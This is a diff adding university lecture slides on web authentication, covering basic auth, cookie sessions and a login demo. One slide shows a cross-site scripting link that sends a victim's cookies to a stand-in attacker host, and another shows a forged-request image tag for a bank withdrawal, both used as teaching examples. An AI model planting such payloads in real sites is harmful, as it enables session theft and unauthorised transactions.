@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="utf-8"/>
-<title></title>
+<title>Hypermedia/Backend/Sessions, login and state</title>
 <meta name="author" content="(Vittorio Zaccaria)"/>
 <style type="text/css">
 .underline { text-decoration: underline; }
@@ -26,9 +26,200 @@
 <body>
 <div class="reveal">
 <div class="slides">
-<section id="sec-title-slide"><h2 class="author">Vittorio Zaccaria</h2><p class="date">Created: 2019-02-25 Mon 15:45</p>
+<section id="sec-title-slide"><h1 class="title">Hypermedia/Backend/Sessions, login and state</h1><h2 class="author">Vittorio Zaccaria</h2><p class="date">Created: 2019-03-05 Tue 09:13</p>
 </section>
 <script src="reveal-bundle.js"></script>
+
+<section>
+<section id="slide-a0">
+<h2 id="a0">Authentication</h2>
+</section>
+<section id="slide-a1">
+<h3 id="a1">Meaning</h3>
+<p>
+Proving or showing something to be true, genuine, or valid, e.g.:
+</p>
+
+<pre class="example">
+Hei, I am Bill Gates, transfer 1M$ to this bank account.
+</pre>
+
+<p>
+How can you trust that a message you receive is genuine?
+</p>
+
+</section>
+<section id="slide-a2">
+<h3 id="a2">Methods to do it in a web app</h3>
+<ul>
+<li>HTTP basic auth over HTTPS;</li>
+<li>Cookies and session management;</li>
+<li>Token in HTTP headers (e.g. OAuth 2.0 + JWT); <b>not discussed here</b></li>
+<li>Query Authentication with additional signature parameters; <b>not discussed here</b></li>
+
+</ul>
+
+</section>
+<section id="slide-a3">
+<h3 id="a3">HTTP basic auth over HTTPS</h3>
+<ul>
+<li><p>
+Client issues
+</p>
+<pre  class="example">
+GET /login HTTP/1.1
+Host: www.example.org
+</pre></li>
+
+<li><p>
+The server responds to a client with a <code>401 (Unauthorized)</code> response with a
+<code>WWW-Authentication</code> header. The client will ask the user for the name and the password
+and send it encoded in base 64:
+</p>
+
+<pre  class="example">
+GET /login HTTP/1.1
+Host: www.example.org
+Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==
+</pre></li>
+
+<li><a href="https://stackoverflow.com/questions/233507/how-to-log-out-user-from-web-site-using-basic-authentication">there is no easy way to log out the user</a> as the client will always send the Authorization header 
+in each subsequent request</li>
+
+</ul>
+
+</section>
+<section id="slide-a4">
+<h3 id="a4">Cookie session management</h3>
+<ul>
+<li>A cookie is a method to relate different requests to the same user</li>
+
+<li>When appropriate (e.g., POST to <code>/user/login</code>), the server will answer with a
+piece of information (<b>cookie</b>) in a <code>Set-Cookie</code> header</li>
+
+<li>The browser puts it into a cookie jar, and the cookie will be sent along with
+every request made to the same origin in the Cookie <code>HTTP</code> header.</li>
+
+<li>Here we talk about <code>HttpOnly</code> cookies; they cannnot be accessed by javascript</li>
+
+</ul>
+
+</section>
+<section id="slide-a5">
+<h3 id="a5">What goes into a cookie?</h3>
+<ul>
+<li><b>Unique session identifier</b>: a number assigned by the server that can be used by
+it to map it back to a user</li>
+
+<li>Expiration information</li>
+
+</ul>
+
+</section>
+<section id="slide-a6">
+<h3 id="a6">Cookie: example</h3>
+<ul>
+<li><p>
+Browser sends: 
+</p>
+
+<pre  class="example">
+POST /login HTTP/1.1
+Host: www.example.org
+&lt;&lt;user name and password&gt;&gt; 
+</pre></li>
+
+<li><p>
+Server sends:
+</p>
+<pre  class="example">
+HTTP/1.0 200 OK
+Content-type: text/html
+Set-Cookie: theme=light
+Set-Cookie: sessionToken=abc123; Expires=Wed, 09 Jun 2021 10:18:14 GMT 
+</pre></li>
+
+<li><p>
+Broswer next requests:
+</p>
+
+<pre  class="example">
+GET /shoppingcart/1 HTTP/1.1
+Host: www.example.org
+Cookie: theme=light; sessionToken=abc123
+</pre></li>
+
+</ul>
+
+</section>
+<section id="slide-a7">
+<h3 id="a7">Cross site scripting</h3>
+<p>
+Attacker posts some html in a message to <code>www.megaforum.com</code>:
+</p>
+
+<div class="org-src-container">
+
+<pre><code class="html" ><a href="#" 
+   onclick="window.location = 'http://attacker.com/stole.cgi?text=' 
+  + escape(document.cookie); return false;">Click here!</a>
+</code></pre>
+</div>
+
+<p>
+If another user of the forum clicks the link, all his/her cookies accessible
+from www.megaforum.com are sent to the attacker.
+</p>
+
+</section>
+<section id="slide-a8">
+<h3 id="a8">Cross site request forgery</h3>
+<p>
+On the same forum, if the attacker posts an image such as:
+</p>
+
+<div class="org-src-container">
+
+<pre><code class="html" ><img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory"> 
+</code></pre>
+</div>
+
+<p>
+this could trigger the transaction for a viewer authenticated (i.e., with a
+cookie) with the bank.
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org0252f99">
+<h2 id="org0252f99">Introducing session state</h2>
+<div class="outline-text-2" id="text-org0252f99">
+</div>
+</section>
+<section id="slide-orgd099d38">
+<h3 id="orgd099d38">Demo D3.0 - Add a user with login and logout actions to the OpenAPI spec</h3>
+
+</section>
+<section id="slide-orge9fccbe">
+<h3 id="orge9fccbe">Demo D3.1 - Add cookie-session</h3>
+<ul>
+<li>Check with curl:</li>
+
+</ul>
+<div class="org-src-container">
+
+<pre><code class="shell" >curl -X POST --header 'Content-Type: application/x-www-form-urlencoded' --header 'Accept: application/json' -d 'username=1&password=1' 'http://localhost:8080/v2/user/login' -v
+</code></pre>
+</div>
+
+</section>
+<section id="slide-org23c1413">
+<h3 id="org23c1413">Handson D3.2 - Add a <code>user/logout</code> endpoint</h3>
+</section>
+<section id="slide-orgc1cba9c">
+<h3 id="orgc1cba9c">Handson D3.3 - Add a <code>user/register</code> endpoint</h3>
+</section>
+</section>
 </div>
 </div>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/3.7.0/lib/js/head.min.js"></script>
